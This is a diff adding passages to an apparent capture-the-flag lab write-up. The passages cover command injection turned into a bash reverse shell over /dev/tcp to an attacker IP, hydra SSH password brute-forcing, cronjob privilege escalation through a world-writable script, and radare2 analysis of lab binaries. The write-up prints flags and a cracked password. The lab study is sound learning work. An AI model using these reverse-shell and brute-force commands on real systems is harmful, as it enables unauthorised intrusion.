@@ -525,21 +525,134 @@ nc -nvlp 80
 ## Commands
 
 ```shell
+#this challenge is related to command injection
+#on visiting /api/cmd endpoint, we do not get anything
+#we can use curl for a better look
+
+curl http://10.10.41.55:3000/api/cmd/
+#does not give anything
+
+curl http://10.10.41.55:3000/api/cmd/ls
+#lists the files
+#so command injection works
+
+#we can use reverse shell commands
+#setup a listener using 'nc -nvlp 8080'
+curl http://10.10.41.55:3000/api/cmd/bash -i >& /dev/tcp/10.17.48.136/8080 0>&1
+#for reverse shell, this does not work
+#we will have to URL-encode the characters
+
+curl http://10.10.41.55:3000/api/cmd/bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.17.48.136%2F8080%200%3E%261
+#this gives us the reverse shell
+#user.txt can be found in /home/bestadmin
 ```
 
 ## Cronjob Privilege Escalation
 
 ```shell
+nmap -T4 -p- -A 10.10.34.157
+#ssh is running on port 4567
+
+#use hydra to crack sam's ssh password
+hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.34.157 -s 4567 -t 4 ssh
+#password is 'chocolate'
+
+ssh sam@10.10.34.157 -p 4567
+#this gives us flag1
+#THM{dec4389bc09669650f3479334532aeab}
+
+#we know that flag2.txt can be read only by 'ubuntu' user
+#now we have to escalate privileges using cronjob running every minute
+cat /etc/crontab #view cronjobs
+#this does not show us anything interesting
+#there is another directory named 'scripts'
+#there, we have a file called clean_up.sh, which can be edited by everyone
+#it clears files in /tmp every minute
+
+cd /home/scripts
+
+echo "chmod 444 /home/ubuntu/flag2.txt" > clean_up.sh
+
+#now wait for a minute
+cat /home/ubuntu/flag2.txt
+#THM{b27d33705f97ba2e1f444ec2da5f5f61}
 ```
 
 ## Reverse Elf-ineering
 
+```markdown
+We are given a zip file containing two ELF files, file1 and challenge1.
+
+We can use radare2 (r2) tool for Reverse Engineering.
+
+Firstly, we have to run the program 'challenge1'
+Then we can use r2 to get more info
+```
+
 ```shell
+./challenge1 #no output
+
+#to open binary in debug mode
+r2 -d ./challenge1
+
+#we are in r2 now
+aa #to analyze program
+
+? #help
+
+a? #help about analysis
+
+afl #list of functions
+
+afl | grep main #functions with 'main' in it
+#helps us find main function
+
+pdf @main #print disassembly function for main
+#this gives us a clue about what is going on with the variables
+
+#value of local_ch when corresponding movl instruction called - 1
+#value of eax when imull instruction called - 6
+#value of local_4h before eax set to 0 - 6
 ```
 
 ## If Santa, Then Christmas
 
 ```shell
+#this challenge is also related to reverse engineering
+#this is related to if statements in binaries.
+
+#we have to analyze if2 file
+r2 -d if2
+
+e asm.syntax=att #setting assembly syntax mode
+
+aaa #analyze program
+
+afl #lists functions
+
+pdf @main #disassembles main function
+
+#we have to add breakpoints now to the jle and jmp instructions
+db 0x00400b65
+
+db 0x00400b6b
+
+pdf @main #this shows the 2 breakpoints
+
+dc #start execution
+#hits first breakpoint
+
+#we can view the value of var_4h and var_8h now
+px @rbp-0x4 #var_4h - value 2
+
+px @rbp-0x8 #var_8h - value 8
+
+dc
+#hits second breakpoint
+
+px @rbp-0x4 #var_4h - value 2 - flag1
+
+px @rbp-0x8 #var_8h - value 9 - flag2
 ```
 
 ## LapLANd (SQL Injection)
